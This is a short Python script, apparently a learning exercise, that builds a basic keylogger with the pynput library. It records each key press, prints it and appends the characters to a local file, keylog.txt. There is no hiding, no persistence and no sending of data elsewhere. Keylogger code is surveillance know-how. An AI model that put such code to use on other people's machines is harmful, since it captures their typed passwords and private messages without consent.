#This program will be used to create a keylogger for learning purposes.

from pynput import keyboard 

class Keylogger:

    def keyIsPressed(key):
        print(str(key)) #This is printing the keys that are being pressed.
        with open("keylog.txt", 'a') as logKey: #This file will store the keys being pressed. Each key will be appended to the text file.
            try:
                char = key.char
                logKey.write(char)
            except:
                print("Error getting the character.")


    if __name__ == "__main__":
        listener = keyboard.Listener(on_press = keyIsPressed) #When the keyboard is pressed, send the key that was pressed to the keyIsPressed function.
        listener.start() #Listener is started for the keyboard.
        input()